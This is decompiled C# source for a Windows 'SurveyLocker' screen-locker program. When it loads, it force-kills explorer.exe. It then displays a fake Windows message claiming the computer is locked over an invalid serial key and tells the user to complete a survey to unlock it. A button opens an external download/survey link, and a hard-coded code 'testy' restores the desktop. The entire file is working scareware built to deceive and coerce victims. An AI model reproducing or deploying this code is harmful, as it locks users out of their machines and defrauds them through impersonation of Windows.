using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace SurveyLocker;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("WinEightTheme1")]
	private WinEightTheme _WinEightTheme1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("WinEightButton1")]
	private WinEightButton _WinEightButton1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("WinEightButton2")]
	private WinEightButton _WinEightButton2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual WinEightTheme WinEightTheme1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WinEightTheme1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WinEightTheme1 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual WinEightButton WinEightButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WinEightButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = WinEightButton1_Click;
			if (_WinEightButton1 != null)
			{
				((Control)_WinEightButton1).remove_Click(eventHandler);
			}
			_WinEightButton1 = value;
			if (_WinEightButton1 != null)
			{
				((Control)_WinEightButton1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual WinEightButton WinEightButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _WinEightButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = WinEightButton2_Click;
			if (_WinEightButton2 != null)
			{
				((Control)_WinEightButton2).remove_Click(eventHandler);
			}
			_WinEightButton2 = value;
			if (_WinEightButton2 != null)
			{
				((Control)_WinEightButton2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer1 = value;
		}
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected O, but got Unknown
		//IL_0591: Unknown result type (might be due to invalid IL or missing references)
		//IL_059b: Expected O, but got Unknown
		components = new Container();
		Bloom bloom = new Bloom();
		Bloom bloom2 = new Bloom();
		Bloom bloom3 = new Bloom();
		Timer1 = new Timer(components);
		WinEightTheme1 = new WinEightTheme();
		Label2 = new Label();
		Label1 = new Label();
		WinEightButton2 = new WinEightButton();
		TextBox3 = new TextBox();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		WinEightButton1 = new WinEightButton();
		((Control)WinEightTheme1).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1);
		WinEightTheme1.BorderStyle = (FormBorderStyle)0;
		bloom.Name = "BackColor";
		bloom.Value = Color.White;
		WinEightTheme1.Colors = new Bloom[1] { bloom };
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)Label2);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)Label1);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)WinEightButton2);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)TextBox3);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)TextBox2);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)TextBox1);
		((Control)WinEightTheme1).get_Controls().Add((Control)(object)WinEightButton1);
		WinEightTheme1.Customization = "/////w==";
		((Control)WinEightTheme1).set_Dock((DockStyle)5);
		WinEightTheme1.Font = new Font("Verdana", 8f);
		WinEightTheme1.Image = null;
		WinEightTheme winEightTheme = WinEightTheme1;
		Point location = new Point(0, 0);
		((Control)winEightTheme).set_Location(location);
		WinEightTheme1.Movable = true;
		((Control)WinEightTheme1).set_Name("WinEightTheme1");
		WinEightTheme1.NoRounding = false;
		WinEightTheme1.Sizable = true;
		WinEightTheme winEightTheme2 = WinEightTheme1;
		Size size = new Size(503, 127);
		((Control)winEightTheme2).set_Size(size);
		((Control)WinEightTheme1).set_TabIndex(0);
		WinEightTheme1.Text = "Windows is locked.";
		WinEightTheme1.TransparencyKey = Color.Fuchsia;
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 10f));
		Label label = Label2;
		location = new Point(44, 41);
		((Control)label).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label2 = Label2;
		size = new Size(417, 17);
		((Control)label2).set_Size(size);
		((Control)Label2).set_TabIndex(6);
		Label2.set_Text("Please complete a short survery to unlock your computer.");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 10f));
		Label label3 = Label1;
		location = new Point(30, 25);
		((Control)label3).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label4 = Label1;
		size = new Size(447, 17);
		((Control)label4).set_Size(size);
		((Control)Label1).set_TabIndex(5);
		Label1.set_Text("Windows has locked your computer due to a invalid serial key.");
		bloom2.Name = "BackColor";
		bloom2.Value = Color.Black;
		WinEightButton2.Colors = new Bloom[1] { bloom2 };
		WinEightButton2.Customization = "AAAA/w==";
		WinEightButton2.Font = new Font("Verdana", 8f);
		WinEightButton2.Image = null;
		WinEightButton winEightButton = WinEightButton2;
		location = new Point(392, 62);
		((Control)winEightButton).set_Location(location);
		((Control)WinEightButton2).set_Name("WinEightButton2");
		WinEightButton2.NoRounding = false;
		WinEightButton winEightButton2 = WinEightButton2;
		size = new Size(99, 23);
		((Control)winEightButton2).set_Size(size);
		((Control)WinEightButton2).set_TabIndex(4);
		WinEightButton2.Text = "Survey";
		WinEightButton2.Transparent = false;
		TextBox textBox = TextBox3;
		location = new Point(284, 94);
		((Control)textBox).set_Location(location);
		((TextBoxBase)TextBox3).set_MaxLength(5);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox2 = TextBox3;
		size = new Size(91, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox3).set_TabIndex(3);
		TextBox textBox3 = TextBox2;
		location = new Point(160, 94);
		((Control)textBox3).set_Location(location);
		((TextBoxBase)TextBox2).set_MaxLength(5);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(91, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(2);
		TextBox textBox5 = TextBox1;
		location = new Point(36, 94);
		((Control)textBox5).set_Location(location);
		((TextBoxBase)TextBox1).set_MaxLength(5);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox6 = TextBox1;
		size = new Size(91, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		bloom3.Name = "BackColor";
		bloom3.Value = Color.Black;
		WinEightButton1.Colors = new Bloom[1] { bloom3 };
		WinEightButton1.Customization = "AAAA/w==";
		WinEightButton1.Font = new Font("Verdana", 8f);
		WinEightButton1.Image = null;
		WinEightButton winEightButton3 = WinEightButton1;
		location = new Point(392, 91);
		((Control)winEightButton3).set_Location(location);
		((Control)WinEightButton1).set_Name("WinEightButton1");
		WinEightButton1.NoRounding = false;
		WinEightButton winEightButton4 = WinEightButton1;
		size = new Size(99, 23);
		((Control)winEightButton4).set_Size(size);
		((Control)WinEightButton1).set_TabIndex(0);
		WinEightButton1.Text = "Validate";
		WinEightButton1.Transparent = false;
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(503, 127);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)WinEightTheme1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)WinEightTheme1).ResumeLayout(false);
		((Control)WinEightTheme1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Interaction.Shell("cmd.exe /c taskkill /f /im explorer.exe", (AppWinStyle)2, false, -1);
	}

	private void WinEightButton2_Click(object sender, EventArgs e)
	{
		Process.Start("http://downloadconfirm.net/file/04O8B8");
	}

	private void WinEightButton1_Click(object sender, EventArgs e)
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		if (((uint)(Strings.InStr(TextBox1.get_Text(), "testy", (CompareMethod)0) & Strings.InStr(TextBox2.get_Text(), "testy", (CompareMethod)0)) & (0u - ((Strings.InStr(TextBox3.get_Text(), "testy", (CompareMethod)0) != 0) ? 1u : 0u))) != 0)
		{
			Interaction.Shell("cmd.exe /c C:\\Windows\\explorer.exe", (AppWinStyle)2, false, -1);
			Interaction.Shell("cmd.exe /c taskkill /f /im cmd.exe", (AppWinStyle)2, false, -1);
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("Incorrect serial key, please try again.", "Incorrect", (MessageBoxButtons)0);
		}
	}
}
